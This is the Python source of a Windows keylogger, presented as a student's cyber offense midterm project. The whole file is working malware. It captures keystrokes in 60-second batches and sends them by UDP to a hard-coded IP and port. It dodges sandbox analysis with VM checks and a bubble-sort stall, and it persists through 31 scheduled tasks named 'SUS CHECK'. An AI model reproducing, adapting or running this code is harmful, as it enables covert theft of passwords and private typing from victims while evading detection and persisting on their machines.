########################################################################
#
# Program: Persistent, Evasive Keylogger (Cyber Offense Midterm Project)
#
# Author: Jacob Miller
#
########################################################################

#Notes:
#This program is designed to log your keystrokes and send them elsewhere so
#please execute with care/don't let yourself get accidentally infected.

import time
import socket
import keyboard as kb
import datetime
import os
import psutil
import platform
import random
import win32com.client

IP = "192.168.168.129"
PORT = 4692

#The main function first determines whether the host machine is a real machine
#that an attacker would like to compromise or if it's just a VM set up to dynamically
#analyze my program for malicious behavior.

#After that, it establishes persistence through use of Windows Task Scheduler and
#opens a socket to send UDP packets. It then records keyboard inputs in 60 second
#intervals and sends them to the designated IP.
def main():

    #Tries to check if program is being run on VM
    check = check_if_sort()
    
    #If VM is detected, run bubblesort indefinitely
    if(check):
        E_ls = [None] * 99999
        for i in range(len(E_ls)):
            E_ls[i] = random.randint(0, 99999)
        ESort(E_ls)
    
    #Schedule persistence
    sch()
    
    #Prepare socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    #Records keystrokes every 60 seconds, then sends to listener
    while(True):
        string = ""

        kb.start_recording()
        time.sleep(60)
        data = kb.stop_recording()

        for i in range(len(data)):
            if(data[i].event_type == "down"):
                #Special Case for space
                if(data[i].name == "space"):
                    string = string + " "
                #Special case for unique keys (i.e. not letters/numbers)
                elif(len(data[i].name) > 1):
                    string = string + "KEY[" + data[i].name + "]"
                #Default
                else:
                    string = string + data[i].name
        
        sock.sendto(string.encode(), (IP, PORT))
    
#Does some checks to see if the program is being run on a VM
def check_if_sort():
    
    #Check for VMWare Tools
    tool_dir = "C:\\Program Files\\VMWare Tools"
    if(os.path.isdir(tool_dir) == True):
        return -1
    
    
    #Check if sleeps get patched out
    #Issue with this strategy: rare edge case where time goes from
    #23:59:59 to 00:00:00
    wait = datetime.datetime.now() + datetime.timedelta(minutes=1)
    wait_time = int(wait.strftime("%H%M%S"))
    
    time.sleep(60)
    if(int(datetime.datetime.now().strftime("%H%M%S")) < wait_time):
        return -1
    
    
    #Check if total storage is at least 128GB
    #Minimum value might merit being lowered (is 64GB too low?)
    total_storage = 0.0
    partitions = psutil.disk_partitions()
    for partition in partitions:
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except PermissionError:
            # this can be catched due to the disk that
            # isn't ready
            continue

        total_storage += float(my_get_size(partition_usage.total))
    #print(total_storage)
    if(total_storage < 128.0):
        return -1
    
    return 0

#Function to convert bytes to gigabytes
def my_get_size(bytes):
    factor = 1024
    bytes /= factor
    bytes /= factor
    bytes /= factor
    return f"{bytes:.2f}"

#Indefinite Bubble Sort
#The program ends up stuck here if it detects that it is being run on a virtual
#machine for dynamic analysis.
def ESort(list_to_sort):
    
    E_count = 0
    
    while(E_count < 101):
    
        list_two_sort = list_to_sort
        length = len(list_two_sort)
        print("hi")
        
        for i in range(length-1):
     
            for j in range(0, length-i-1):
     
                if list_two_sort[j] > list_two_sort[j + 1] :
                    list_two_sort[j], list_two_sort[j + 1] = list_two_sort[j + 1], list_two_sort[j]
        
        E_count += 1
        
        if(E_count == 100):
            E_count = 0
    
    return

#Schedules the program to be run once a day at the current time for a month
#I would have liked to set the program to be run on logon, but that requires
#an escalation to administrator privileges, which is outside the scope of this program.
def sch():
    scheduler = win32com.client.Dispatch('Schedule.Service')
    scheduler.Connect()
    root_folder = scheduler.GetFolder('\\')
    
    for i in range(31):
    
        task_def = scheduler.NewTask(0)

        TASK_ACTION_EXEC = 0
        action = task_def.Actions.Create(TASK_ACTION_EXEC)
        action.Path = str(os.getcwd()) + "\\" + str(os.path.basename(__file__))
        action.Arguments = ''

        task_def.RegistrationInfo.Description = 'yuh'
        task_def.Settings.Enabled = True
        task_def.Settings.StopIfGoingOnBatteries = False
        
        start_time = datetime.datetime.now() + datetime.timedelta(days=i)
        TASK_TRIGGER_TIME = 1
        trigger = task_def.Triggers.Create(TASK_TRIGGER_TIME)
        trigger.StartBoundary = start_time.isoformat()

        TASK_CREATE_OR_UPDATE = 6
        TASK_LOGON_NONE = 0
        root_folder.RegisterTaskDefinition(
            f"SUS CHECK {i}",  # Task name
            task_def,
            TASK_CREATE_OR_UPDATE,
            '',  # No user
            '',  # No password
            TASK_LOGON_NONE)
    
    return

#Runs Main    
if(__name__ == "__main__"):
    main()
